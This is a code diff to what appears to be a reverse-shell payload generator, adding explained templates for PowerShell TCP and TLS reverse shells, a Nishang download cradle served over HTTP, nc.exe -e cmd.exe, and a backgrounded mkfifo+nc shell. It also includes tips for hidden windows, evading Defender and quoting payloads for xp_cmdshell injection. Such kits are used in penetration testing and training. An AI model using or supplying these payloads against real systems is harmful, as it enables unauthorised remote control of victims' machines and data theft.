@@ -19,6 +19,13 @@ const SERVE_PART = {
   token: "python3 -m http.server",
   explain: "On Kali, from the folder with the file: serves it on port 80, or on 8000 when your listener takes 80 (the cradle URL then says :8000). Leave it running until the shell connects.",
 };
+/** What the base64 script of POWERSHELL_TCP does (and POWERSHELL_TLS, after its SslStream): decoded parts. */
+const PS_SCRIPT_PARTS = [
+  { token: 'TCPClient("{LHOST}",{LPORT})', explain: "Inside the base64: opens the TCP connection to your listener.", decoded: true },
+  { token: "$stream.Read(", explain: "Inside the base64: the loop that reads each command you type from the connection, until it closes.", decoded: true },
+  { token: "iex $data", explain: "Inside the base64: Invoke-Expression runs what you typed; 2>&1 | Out-String brings errors back with the output.", decoded: true },
+  { token: '"PS " + (pwd).Path + "> "', explain: "Inside the base64: sends a PS C:\\path> prompt after each output, so you see where you are.", decoded: true },
+];
 const ALL_LINUX = ["bash-prompt", "injected-linux", "url-param", "webshell-param", "php-system"] as const;
 
 export const REVERSE_SHELLS: PayloadDef[] = [
@@ -45,7 +52,7 @@ export const REVERSE_SHELLS: PayloadDef[] = [
     id: "mkfifo-nc-bg", generator: "shell", title: "mkfifo + nc, backgrounded", os: "linux",
     contexts: [...ALL_LINUX], requires: ["nc"], template: `(${FIFO}) &`,
     parts: [
-      { token: "( ", explain: "Subshell: groups the whole chain so it can be detached as one job." },
+      { token: "(", explain: "Subshell: groups the whole chain so it can be detached as one job." },
       ...FIFO_PARTS,
       BASH_C_PART,
       { token: ") &", explain: "Backgrounds the group so it survives a parent that reaps its children (UDF, popen, request worker)." },
@@ -88,6 +95,7 @@ export const REVERSE_SHELLS: PayloadDef[] = [
       { token: "-nop", explain: "-nop: no profile, so nothing slows or alters the start." },
       { token: "-w hidden", explain: "-w hidden: no visible window on the target." },
       { token: "-e", explain: "-e (same as -enc, -EncodedCommand): the argument is base64 of UTF-16LE text. Plain UTF-8 base64 produces garbage." },
+      ...PS_SCRIPT_PARTS,
     ],
     listeners: REVERSE,
     notes: ["A working shell makes the web request hang. If it returns at once, the payload did not hold the socket."],
@@ -115,7 +123,7 @@ export const REVERSE_SHELLS: PayloadDef[] = [
     parts: [
       { token: "cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1", explain: "On Kali: copies Nishang's reverse-shell script to rev.ps1 in the folder you serve. From Kali's `nishang` package; check the path with `dpkg -L nishang | grep Invoke-PowerShellTcp` if cp fails." },
       {
-        token: "echo 'Invoke-PowerShellTcp -Reverse -IPAddress … -Port …' >> rev.ps1",
+        token: "echo 'Invoke-PowerShellTcp -Reverse -IPAddress {LHOST} -Port {LPORT}' >> rev.ps1",
         explain: "Appends the call, with your LHOST and LPORT, to the end of rev.ps1. Without it IEX only defines the function and nothing connects back.",
       },
       SERVE_PART,
@@ -128,14 +136,14 @@ export const REVERSE_SHELLS: PayloadDef[] = [
     ],
     listeners: REVERSE, bakesIp: true, serve: SERVE,
     prepare: "cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1\necho 'Invoke-PowerShellTcp -Reverse -IPAddress {LHOST} -Port {LPORT}' >> rev.ps1",
-    notes: ["Inside a SQL string the single quotes are doubled, so it survives xp_cmdshell '...'."],
+    contextNotes: { "sql-string": ["Inside a SQL string the single quotes are doubled, so it survives xp_cmdshell '...'."] },
   },
   {
     id: "nc-exe", generator: "shell", title: "nc.exe -e", os: "windows",
     contexts: ["cmd", "powershell", "webshell-param", "url-param"], requires: ["nc-e"],
     template: "{FILE} -e cmd.exe {LHOST} {LPORT}", defaults: { FILE: "C:\\Windows\\Temp\\nc.exe" },
     parts: [
-      { token: "nc.exe", explain: "The uploaded netcat. Defender may delete it: check it is still there if nothing arrives." },
+      { token: "{FILE}", explain: "The uploaded netcat (FILE, default C:\\Windows\\Temp\\nc.exe; nc64.exe works too). Defender may delete it: check it is still there if nothing arrives." },
       { token: "-e", explain: "-e: run this program and attach it to the socket." },
       { token: "cmd.exe", explain: "The program handed to the connection." },
     ],
@@ -226,6 +234,9 @@ export const REVERSE_SHELLS: PayloadDef[] = [
       { token: "-nop", explain: "-nop: no profile, so nothing slows or alters the start." },
       { token: "-w hidden", explain: "-w hidden: no visible window on the target." },
       { token: "-e", explain: "-e (same as -enc, -EncodedCommand): the argument is base64 of UTF-16LE text. Inside it, SslStream wraps the connection in TLS and accepts any certificate." },
+      PS_SCRIPT_PARTS[0]!,
+      { token: "SslStream(", explain: "Inside the base64: wraps the connection in TLS and accepts any certificate, so ncat --ssl's throwaway one works.", decoded: true },
+      ...PS_SCRIPT_PARTS.slice(1),
     ],
     listeners: ["ncat-ssl"],
     notes: ["Pairs with ncat --ssl (it makes a throwaway certificate) or openssl s_server -quiet -key key.pem -cert cert.pem -port <your LPORT>.",
